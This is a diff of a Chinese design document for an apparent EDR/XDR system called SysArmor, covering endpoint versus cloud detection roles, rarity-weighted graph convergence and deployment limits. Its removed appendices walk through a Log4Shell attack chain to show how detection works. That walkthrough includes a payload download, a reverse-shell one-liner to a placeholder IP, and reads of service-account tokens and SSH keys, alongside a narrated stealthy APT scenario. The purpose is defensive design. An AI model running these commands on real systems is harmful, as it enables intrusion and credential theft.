+## 七、端侧与云端分工
 
-事实分两条路走，对应两种不同的"急迫性"：
+### 7.1 端侧为什么轻
 
-**快路径（端侧，毫秒级）**：少数模式单机就能高置信判定恶意，且等不起云端往返——比如一个交互式 shell 把标准输入输出重定向到了外网 socket。这类直接产出**高风险 Signal**（带 response 属性），在 ResponsePolicy 授权范围内立即 kill/block。它仍然上云，但不等云端。快路径的存在理由只有一个：**在攻击造成损害前的那几秒里动手**。
+端侧不建全局图,只维护有限状态：
 
-**慢路径（云端，秒级到分钟级）**：绝大多数 Signal 单条无害（低风险），它们汇入云端图，由云端 Signal 规则做跨实体判断、由罕见度加权 + 结构收敛把散落的高异常节点连成最小攻击子图。这条路负责**把孤立事实拼成可解释的攻击故事**，产出唯一对外的 Incident。
+```text
+进程上下文表      活跃进程身份、父链、lineage_id
+谱系规则状态      每条 lineage 的计数器和短序列
+实体接触缓存      最近文件/socket/token 接触关系
+原始事件环形缓冲  云端回拉证据
+上传队列          断网续传
+```
 
-端侧产物是云端收敛的**种子和先验**，分两种 terminal：
+端侧可以做：
 
-- **"响"的攻击**：端侧规则就能高置信判定（如反弹 shell），端侧直接产出 **terminal + 证据包**（terminal 锚点 + lineage 子树切片 + 两跳邻居 + raw 引用），云端只缝合确认。
-- **"低慢散"的 APT**：端侧给不出 terminal（每条都低风险），只吐**带实体键的候选 Signal**，由云端罕见度 + 扩散把其中真正异常的浮成 terminal。
+- 本机上下文打标。
+- lineage 维护。
+- 两跳关联。
+- 高置信快路径 detection。
+- observe/enforce response execution。
 
-两条路都用端侧产物当种子，互补不冲突。一条边界要守住：**罕见度的"全局基线"和扩散/STP 都需要图或全局视角，只能在云端**；端侧只做"本机罕见度 + 两跳关联 + 规则级 terminal"，**不做全局判定、不算累计 score**——否则又会掉回端侧加性溢出。
+端侧不应该做：
 
-一句话分工：**端侧负责把"事件"变成"事实"、拦住最危险的瞬间、并广撒带标签的种子；云端负责把"事实"连成"故事"并裁决告警。**
+- 全局图。
+- 跨主机裁决。
+- 长跨度全局罕见度。
+- 大规模搜索。
+- 累计加分式告警。
+
+### 7.2 云端为什么建图
+
+云端天然汇聚多 agent、多 workload、多时间窗口、多安全域的事实。它负责：
+
+- 跨 lineage stitching。
+- 跨 host / container / pod / namespace 关联。
+- 跨 identity / cloud / network 关联。
+- 全局或局部 rarity baseline。
+- 结构收敛。
+- incident lifecycle。
+- evidence path。
+
+一句话：端侧负责“把事实说清楚、拦住瞬间”,云端负责“把事实连成故事、裁决告警”。
 
 ---
 
-## 八、和成熟 EDR 的对标
+## 八、收敛原则
 
-我们刻意对标 Falcon 和 SentinelOne，但把它们做成两个独立子系统的能力，融进了同一根纵轴。换句话说,SysArmor Next 的 EDR 目标不是只做"采集 + 规则",而是同时覆盖行为检测、深度溯源、响应和调查闭环；XDR 目标是在同一套事实模型上接入更多安全域。
+### 8.1 为什么不能用加法
 
-| 它们的设计 | SysArmor 对应 | 关键差异 |
-|---|---|---|
-| Falcon **IOA**（行为规则引擎，端侧跑、云端 Threat Graph 关联） | Signal 规则（端侧 + 云端两侧） | IOA 命中即检测信号；我们把它统一为 Signal，低风险的能当复用积木被别的规则引用 |
-| SentinelOne **Storyline**（端侧把同谱系事件在线串成一条线） | lineage | Storyline 止于"线"（单谱系）；我们把 lineage 降为云端图的索引，真正的关联载体是图，能连跨谱系/跨主机 |
-| 青藤云：行为检测、深度溯源是**两款产品** | 一根纵轴覆盖 | Signal 规则 = 行为检测，Incident 图收敛 = 深度溯源，统一在一条管线 |
+简单风险加法会奖励“忙碌”：
 
-一句话：**Falcon 把"行为检测"和"关联"做成两套、S1 把关联止于"线"、青藤做成两款产品；我们用"三层事实纵轴 + lineage/图索引"把行为检测和深度溯源统一成一条主线。**
+- CI runner 动作多,容易累计高分。
+- 特权 agent 本来就读很多文件、连很多网络。
+- 长寿进程天然事件多。
 
-向 XDR 扩展时,这句话仍然成立:只是图上的实体从 endpoint 进程/文件/socket 扩展到 cloud principal、IAM role、K8s object、registry artifact、network flow、CI job 等。真正保持不变的是事实纵轴、实体 join key、罕见度和结构收敛。
+所以“分数累加超过阈值”会同时造成误报和漏报。
 
----
+### 8.2 正确收敛
 
-## 九、为什么不做另外两种选择
+SysArmor 的裁决应基于两个正交机制：
 
-把主线讲清楚后，两个"为什么不"就自然了：
+1. **罕见度加权**
+   - 行为对其所属实体/workload 越罕见,权重越高。
+   - 惯常行为权重趋零。
 
-- **为什么不在端侧建全局图？**（学术系统 / 部分新锐做法）成本性能难封顶，违背 P4；且图的价值在跨主机，单机图本就不完整。我们把"线"留在端侧（便宜），把"图"放到云端（完整）。
-- **为什么不把裸事件丢给 SIEM 事后查？**（传统 HIDS）丢掉了源头上下文（P3），云端要重建谱系；且查询是被动的，没有实时风险收敛和快路径响应。我们在源头打标、在云端主动收敛。
+2. **结构收敛**
+   - 多个独立罕见点是否在因果上紧凑相连。
+   - 目标是找最小攻击子图,不是累积分数。
 
----
+工程上可以采用：
 
-## 附录 A：一条攻击链如何流过系统（Log4Shell → C2 → 凭据 → 横向）
+- Count-Min Sketch / IDF / workload baseline。
+- Personalized PageRank 局部扩散。
+- Steiner Tree 近似。
+- 相关族去重。
+- terminal anchor。
 
-这是一个 K8s 环境里的典型链路，用它具体看三层事实如何逐级生成。
-
-| 时刻 | 内核事实 (Event) | 端侧产出 (Signal) | 性质 |
-|---|---|---|---|
-| T+0s | `java` 进程 fork/exec `/bin/bash` | `web_runtime_spawns_shell`（低风险） | 无害（kubectl exec 也长这样） |
-| T+2s | `bash` → `curl …/x.sh -o /dev/shm/x.sh; chmod +x` | `payload_dropped`、`download_by_lolbin`（低风险） | 无害（运维也下载脚本） |
-| T+5s | `bash -i >& /dev/tcp/1.2.3.4/443` | `reverse_shell_pattern`（**高风险 + terminal + response**） | 谱系内已有两个低风险 Signal 铺垫，零误报 → 快路径 kill/block，并直接产出 terminal + 证据包 |
-| T+30s | 读 `…/serviceaccount/token`、`/root/.ssh/id_rsa` | `serviceaccount_token_read`、`ssh_key_access`（低风险） | 无害（备份 agent 也读） |
-| T+5min | host-B：`sshd → bash → kubectl get secrets` | `ssh_session_runs_cluster_recon`（低风险） | host-B 端侧不知道这与 host-A 有关 |
-
-端侧产出 **7 个低风险 Signal + 1 个高风险 terminal Signal**。除了反弹 shell 那一刻，单看每条都不构成告警——这正是端侧的本分：翻译事实、拦住瞬间、广撒带实体键的种子，不轻易下结论。
-
-云端把这些 Signal 连成图后，由云端 Signal 规则产出更高风险的 Signal，标注上图：
-
-```text
-云端 Signal（需要图结构，端侧做不到）:
-  落盘的文件被 exec，且该进程外联非私网 IP        （进程→文件→Socket 两跳）
-  读过 SA token 的谱系随后用该 token 调 K8s API    （跨进程因果）
-  host-A 外联 IP 与 host-A→host-B 的 SSH 时间相邻，
-  host-B 谱系命中 recon Signal                    （跨主机，五元组缝合）
-
-罕见度加权 + 结构收敛 → 1 个 Incident（而不是 8 条告警）:
-  "Log4Shell 入侵 → 反弹 C2 → 窃取 SA token → 横向移动到 host-B"
-  terminals: [bash@host-A, kubectl@host-B]
-  evidence:  以两个 terminal 为锚的 N-hop 证据子图（端侧证据包 + 云端结构）
-  附:        全部 Signal + 快路径动作记录 + 可回拉的原始事件引用
-```
-
-没有 Signal 这一层，云端要从裸事件里重新发现"这是落盘""这是读 token"；没有云端图，这些 Signal 要么各自告警（误报风暴）要么沉默（漏报）。三层事实模型让两者各司其职。
+算法可迭代,原则不能退回加法。
 
 ---
 
-## 附录 B：隐蔽 APT 如何被检出，以及与行为型 EDR 的对比
+## 九、部署和运行边界
 
-附录 A 的链路还比较"响"。真正考验架构的是**刻意隐蔽、低慢、贴着正常运维伪装**的高级攻击。这里构造一个贴近真实 APT（参考 APT41 / UNC2452 风格供应链 + living-off-the-land）的场景。
+### 9.1 Agent 部署形态
 
-### 场景：被投毒的运维工具链 → 长期潜伏 → 经合法通道渗出
+支持多种形态：
 
-```text
-Day 0    供应链投毒
-         一个内部基础镜像里的合法运维工具(假设叫 node-agent)被植入后门。
-         它本就是特权 DaemonSet，读配置、连内网、定期上报——行为基线天然"很脏"。
+- host/VM agent。
+- privileged sensor container。
+- K8s DaemonSet。
+- 特殊环境下的 in-container debug/compat agent。
 
-Day 0    植入 (T1546)
-         node-agent 写了一个 systemd drop-in: /etc/systemd/system/…/override.conf
-         指向自己。没有落新二进制，复用已有合法进程。
-
-Day 3    休眠后激活
-         三天无动作。之后每天凌晨在已有的定时上报窗口里，
-         夹带一次对 /var/run/secrets/.../token 的读取——和它平时读配置混在一起。
-
-Day 5    内网探测 (T1018)
-         用读到的 token，通过它本来就持有的 K8s API 连接，
-         低频(每小时几次)枚举其他 namespace 的 secret。请求量淹没在正常上报里。
-
-Day 8    数据渗出 (T1567)
-         把收集到的 secret 分批、加密，混进它每天正常的 HTTPS 上报流量，
-         发往一个域名——这个域名甚至是合法 CDN 上的一个被攻陷的 bucket。
-```
-
-这个攻击的每一个动作都落在 node-agent 的既有权限和既有行为模式内：没有新进程、没有反弹 shell、没有可疑二进制落盘、没有连接陌生 IP。**它把恶意行为藏进了一个"行为基线本来就宽"的合法特权进程里。**
-
-### 行为型 EDR（青藤云等）会怎样
-
-行为型引擎的判定单位是"一个进程/一次行为是否命中规则或偏离基线"。面对这个场景：
-
-- **植入**：写 systemd override 会命中持久化规则——但 node-agent 是运维工具，写系统配置可能本就在白名单里，**大概率被基线吸收**。
-- **读 token**：特权 agent 读 SA token 是常态，**不触发**。
-- **内网枚举**：用合法 token、合法连接、低频——**单点行为无异常**。
-- **渗出**：HTTPS 到合法 CDN 域名，量混在正常上报里——**单点行为无异常**。
-
-行为型 EDR 的根本局限在这里暴露：**它的判定是"点"或"短序列"，缺乏把跨天、跨 namespace、跨动作的稀疏事件缝合成单一叙事的能力。** 青藤把"深度溯源"做成另一款产品，恰恰说明行为引擎本身够不着这条线。即便它有溯源产品，那也是**事后人工拉图**，不是实时自动收敛——分析师得先知道该查 node-agent，才会去拉它的图。而这个 agent 每天产生海量正常事件，没人会主动去查它。
-
-结果：**大概率漏报，最好情况是事后取证时才发现。**
-
-### SysArmor 会怎样
-
-SysArmor 的判定单位不是"点"，而是**图上经罕见度加权、由结构收敛连成的攻击子图**。同样的稀疏事件，在我们的管线里各自留下一份 Signal：
+但产品语义统一为：
 
 ```text
-端侧 Signal（即便每条都低风险、不告警，也都被翻译成命名事实并打上 lineage + 实体键）:
-  Day 0  persistence_via_systemd_override { proc: node-agent }
-  Day 3  serviceaccount_token_read        { proc: node-agent }
-  Day 5  cross_namespace_secret_enum       (低频也照常产出，不靠阈值)
-  Day 8  bulk_outbound_during_report_window (渗出量级 / 熵的轻量特征)
-
-云端图（关键：这些 Signal 落在【同一个 node-agent 谱系节点】及其关联实体上）:
-  - 罕见度加权：node-agent 天天读配置 → 那些行为 rarity≈0、贡献≈0；
-    但它【从不跨 namespace 读 secret】，那一次 rarity≈1 → 高异常分。
-    脏宽基线不再淹没信号——窄基线的偏移最可信。
-  - 云端 Signal（图模式）: 一个进程既"读了多个 namespace 的 secret"又"持续向外发包"
-                 —— 把"采集"和"渗出"两个分散动作在图上连成 read→hold→exfil 链。
-  - 云端 Signal（跨时间）: 持久化(Day0) 与 后续凭据访问(Day3+) 挂在同一 lineage 根上,
-                 时间跨度本身是 APT 信号（不是噪声）。
-  - 结构收敛 (扩散/STP): 把这些散落数天、各自罕见的高异常节点连成一棵最小攻击树。
-                 ——注意不是"把分数加起来"，而是"这些独立罕见点在因果上连得起来吗"。
+agent runtime protects scope
 ```
 
-最终云端产出**一个** Incident：
+而不是：
 
 ```text
-"特权运维进程 node-agent 被持久化篡改，长期低频窃取跨 namespace 凭据，
- 经合法上报通道分批渗出"
-  时间跨度: Day0 → Day8
-  terminals: [node-agent 谱系根, 渗出 socket]
-  evidence: 跨 8 天、跨 namespace 的证据子图
-  这是事后人工也很难手工拼出的链条
+agent installed in some machine/container
 ```
 
-### 为什么 SysArmor 能、行为型 EDR 难
+### 9.2 Gateway / Manager / Analytics
 
-差异不在"规则写得多好"，而在**判定的数学单位不同**：
+云端可以拆成：
 
-| | 行为型 EDR（青藤等） | SysArmor |
-|---|---|---|
-| 判定单位 | 单点行为 / 短序列是否异常 | 罕见度加权 + 结构收敛(扩散/STP)连成的攻击子图 |
-| 稀疏弱信号 | 每个都低于阈值 → 各自沉默 | 罕见者得高异常分 → **由扩散/STP 连成紧凑攻击结构** |
-| 时间跨度 | 长跨度难关联（状态早已过期） | lineage 把跨天事件锚在同一谱系根 |
-| 跨主机/namespace | 难，或靠另一个溯源产品事后拉图 | 云端图原生缝合，实时收敛 |
-| 脏基线下的隐蔽 | 宽基线吸收恶意行为 → 漏 | 靠窄基线偏移（罕见度）+ 图结构，不依赖单点偏离 |
-| 调查 | 需分析师先怀疑某进程才拉图 | Incident 自带完整攻击树，主动呈现 |
+- **Gateway**：连接终结、摄入、ack/resume、策略下发、响应下发。
+- **Manager**：策略、注册、租户、调查、响应授权。
+- **Analytics**：建图、规则、收敛、incident/evidence。
 
-一句话：**行为型 EDR 把每个动作当成独立问题来回答"它正常吗"，所以擅长抓"响"的攻击、漏掉"低慢散"的 APT；SysArmor 把所有动作当成同一张图上的证据来回答"它们合起来在讲什么故事"，所以低慢散的稀疏信号反而会在图上彼此印证、收敛成案。**
+小规模部署可以合进一个进程；架构边界仍要保留。
 
-### 诚实的边界
+### 9.3 Storage
 
-这套架构不是银弹，要说清楚它的代价和前提：
+存储层必须支持：
 
-1. **依赖图上下文的检测有云端延迟**：低慢攻击本来就不要求毫秒响应，可接受；但纯端侧、断网期间，复杂关联检测会缺位（快路径仍兜住"响"的攻击）。
-2. **罕见度模型与云端规则的质量决定上限**：图提供了"能连起来"的能力，但"连起来算不算攻击"仍需好的罕见度基线、规则和收敛参数。架构降低了难度，没有消除它。
-3. **极致隐蔽 + 完全贴合窄基线**：若攻击者连"跨 namespace 读 secret"都恰好在该 agent 的历史行为内，则该信号 rarity 也低、失效——此时只能靠渗出侧特征和其他维度。没有任何系统能检出与合法行为完全同构的攻击。
+- 幂等 ingest。
+- 迁移。
+- 索引。
+- 分页。
+- TTL。
+- 审计。
+- evidence blob 分层。
 
-但相对行为型 EDR，SysArmor 把"能被检出的攻击空间"显著扩大了：**凡是攻击链在图上留下了哪怕彼此孤立的痕迹，只要它们各自足够罕见、且在因果上彼此靠近，结构收敛就能把它们连成案。** 这正是对付低慢隐蔽 APT 最需要的能力。
+### 9.4 External Integration
+
+外部集成分两类：
+
+- **Ingestion**：外部遥测进入 SysArmor 图,必须通过 adapter 归一成 CanonicalEvent / Entity。
+- **Export**：SysArmor 的 incident / signal / audit 输出到 SIEM/SOAR/数据湖,可以使用 OTel Collector 或其他标准出口。
+
+不要用外部出口协议替代内部安全控制通道。
+
+---
+
+## 十、诚实边界
+
+这套架构不是银弹：
+
+1. **依赖云端图的检测有延迟**
+   - 低慢攻击可接受秒级到分钟级收敛。
+   - 端侧断网时,复杂跨域关联会缺位。
+   - 快路径只兜住高置信、单机可判断的危险瞬间。
+
+2. **模型质量决定上限**
+   - 罕见度 baseline、规则内容、实体归一化和收敛参数决定检测质量。
+   - 架构让问题可解,不自动让检测变好。
+
+3. **完全同构合法行为无法被可靠区分**
+   - 如果攻击行为与合法行为在观测维度上完全同构,任何系统都无法无条件检出。
+   - 只能增加观测维度、扩大上下文或依靠外部情报。
+
+4. **响应必须保守**
+   - kill/block/quarantine 对业务有破坏性。
+   - 默认 observe-only,逐步授权,强审计。
+
+---
+
+## 十一、能力完成度的判断标准
+
+一项能力不能只看“有没有代码”,而要看是否具备闭环：
+
+```text
+contract
+  -> implementation
+  -> config/policy expression
+  -> health/observability
+  -> failure/recovery behavior
+  -> e2e proof
+  -> compatibility story
+```
+
+例如：
+
+- Sensor 不只是能读事件,还要能表达 scope、capability、health、policy apply、restart、enforce ack。
+- Policy 不只是一个 proto,还要能 version、assign、fetch、apply、audit、rollback。
+- Incident 不只是一个 JSON,还要有 evidence graph、timeline、lifecycle、query。
+- Link1 不只是 HTTP 200,还要有 ack cursor、resume、idempotency、downlink。
+
+这条标准是后续设计和评审的共同尺子。
